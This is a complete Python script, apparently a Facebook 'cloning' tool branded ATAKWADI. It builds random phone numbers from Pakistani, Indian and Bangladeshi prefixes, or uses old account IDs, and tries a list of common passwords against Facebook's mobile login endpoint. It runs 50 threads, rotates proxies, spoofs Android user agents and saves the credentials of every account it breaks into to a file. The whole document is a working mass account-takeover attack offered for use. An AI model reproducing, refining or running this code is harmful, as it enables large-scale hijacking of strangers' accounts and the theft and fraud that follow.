import os, sys, time, random, string, requests, re, json
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# --- Auto Module Installer ---
try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install requests bs4')

# --- Colors ---
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
Y = '\033[1;33m' # Yellow
P = '\033[1;35m' # Purple
B = '\033[1;34m' # Blue

# --- Global Variables ---
loop = 0
oks = []
cps = []
proxies = []

# --- 2025 Modern User Agents ---
def get_ua():
    android_version = random.choice(['13', '14', '15'])
    fb_version = f"{random.randint(400, 550)}.0.0.{random.randint(10, 99)}.{random.randint(100, 250)}"
    model = random.choice(['SM-S928B', 'Pixel 9 Pro', 'V2303', 'Infinix GT 20 Pro', 'RMX3840'])
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/UP1A.231005.007) [FBAN/FB4A;FBAV/{fb_version};FBBV/{random.randint(500000000, 999999999)};FBDM/{{density=3.0,width=1080,height=2280}};FBLC/en_US;FBRV/0;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

# --- UID Age Checker ---
def get_age(uid):
    try:
        if uid.startswith('100000'): return "2009"
        elif uid.startswith('100001'): return "2010"
        elif uid.startswith('100002'): return "2011"
        elif uid.startswith('100003'): return "2012"
        elif uid.startswith('6155'): return "2024-25"
        else: return "Old Account"
    except: return "N/A"

# --- Logo & Branding ---
def logo():
    os.system('clear')
    now = datetime.now().strftime("%H:%M:%S")
    print(f"""
{R}   ▄▀▄▀▀▀▀▄▀▄  {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}  █          █ {G}  █████  ██████  █████  ██  ██
{R}  █          █ {G}  ██  ██   ██    ██  ██ ██ ██ 
{R}  ▀▄        ▄▀ {G}  ██████   ██    ██████ ████  
{R}    █      █   {G}  ██  ██   ██    ██  ██ ██ ██ 
{R}    █      █   {G}  ██  ██   ██    ██  ██ ██  ██
{W}    ▀▀▀▀▀▀▀▀   {R}       [ ATAKWADI-V-ULTRA ]
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G} [+] OWNER    : ATAKWADI
{G} [+] STATUS   : NO KEY / UNLIMITED
{G} [+] TIME     : {Y}{now}
{G} [+] FILE     : /sdcard/atakwadi_ok.txt
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

# --- Main Menu ---
def main_menu():
    logo()
    print(f" {G}[1] Pakistan Cloning (All SIM Codes)")
    print(f" {G}[2] India Cloning (All SIM Codes)")
    print(f" {G}[3] Bangladesh Cloning (All SIM Codes)")
    print(f" {G}[4] Old UID Cloning (2009-2012)")
    print(f" {G}[5] File Cloning (Unlimited IDs)")
    print(f" {R}[0] Exit")
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    choice = input(f' {G}[?] Select: {W}')
    
    if choice == '1': pk_start()
    elif choice == '2': in_start()
    elif choice == '3': bd_start()
    elif choice == '4': old_start()
    elif choice == '5': file_start()
    else: exit()

# --- SIM & Random Generation Logic ---
def pk_start():
    logo(); print(f" {G}[+] Codes: 0300, 0301, 0315, 0333, 0345"); code = input(f" {G}[?] Code: {W}")
    limit = int(input(f" {G}[?] Limit: {W}"))
    ids = [code + "".join(random.choices(string.digits, k=7)) for _ in range(limit)]
    start_crack(ids)

def in_start():
    logo(); print(f" {G}[+] Codes: +91701, +91802, +91903"); code = input(f" {G}[?] Code: {W}")
    limit = int(input(f" {G}[?] Limit: {W}"))
    ids = [code + "".join(random.choices(string.digits, k=7)) for _ in range(limit)]
    start_crack(ids)

def bd_start():
    logo(); print(f" {G}[+] Codes: 0171, 0181, 0191"); code = input(f" {G}[?] Code: {W}")
    limit = int(input(f" {G}[?] Limit: {W}"))
    ids = [code + "".join(random.choices(string.digits, k=7)) for _ in range(limit)]
    start_crack(ids)

def old_start():
    logo(); limit = int(input(f" {G}[?] Limit: {W}"))
    ids = [random.choice(['100000', '100001', '100002']) + "".join(random.choices(string.digits, k=8)) for _ in range(limit)]
    start_crack(ids)

def file_start():
    logo(); path = input(f" {G}[?] File Path: {W}")
    try:
        ids = open(path, 'r').read().splitlines()
        start_crack(ids)
    except: print(f" {R}[!] File Not Found!"); time.sleep(2); main_menu()

# --- Cracking Engine ---
def start_crack(ids):
    global proxies
    logo()
    # Proxy Load
    if os.path.exists('proxy.txt'):
        proxies = open('proxy.txt', 'r').read().splitlines()
        print(f" {G}[+] Proxies Loaded: {len(proxies)}")
    
    print(f" {G}[+] Total IDs : {W}{len(ids)}")
    print(f" {R}[!] Use Flight Mode for Success")
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    with tred(max_workers=50) as engine:
        for uid in ids:
            engine.submit(crack_method, uid)
    
    print(f"\n{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f" {G}[+] OK IDs: {len(oks)}")
    print(f" {G}[+] Results Saved: /sdcard/atakwadi_ok.txt")
    input(f" {G}[?] Press Enter to Back")
    main_menu()

def crack_method(uid):
    global loop, oks
    age = get_age(uid)
    dt = datetime.now().strftime("%H:%M")
    sys.stdout.write(f'\r {W}[ATAKWADI] {loop}|{G}OK:{len(oks)}{W} '); sys.stdout.flush()
    
    try:
        # High Success Passwords
        pws = [uid, uid[6:], '123456', '12345678', '786786', '572732', '575757', 'pakistan', 'khan123', 'khan786', 'ali123']
        
        for pw in pws:
            if len(pw) < 6: continue
            ua = get_ua()
            session = requests.Session()
            
            # Proxy Rotation
            if proxies:
                prx = {'http': 'socks5://'+random.choice(proxies), 'https': 'socks5://'+random.choice(proxies)}
                session.proxies.update(prx)

            url = "https://b-graph.facebook.com/auth/login"
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "sdk_style": "android",
                "email": uid,
                "password": pw,
                "generate_session_cookies": "1",
                "locale": "en_US",
                "method": "post"
            }
            
            res = session.post(url, data=data, headers={'User-Agent': ua}).json()
            
            if "session_key" in res:
                print(f'\r\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f'{G} [ATAKWADI-OK] {uid} | {pw}')
                print(f'{G} [INFO] Year: {W}{age} {G}| Time: {W}{dt}')
                print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                oks.append(uid)
                open('/sdcard/atakwadi_ok.txt', 'a').write(f"{uid}|{pw}|{age}|{dt}\n")
                break
            elif "checkpoint" in str(res):
                # cps.append(uid) # Checkpoints ignore for speed
                break
        loop += 1
    except:
        pass

if __name__ == "__main__":
    main_menu()
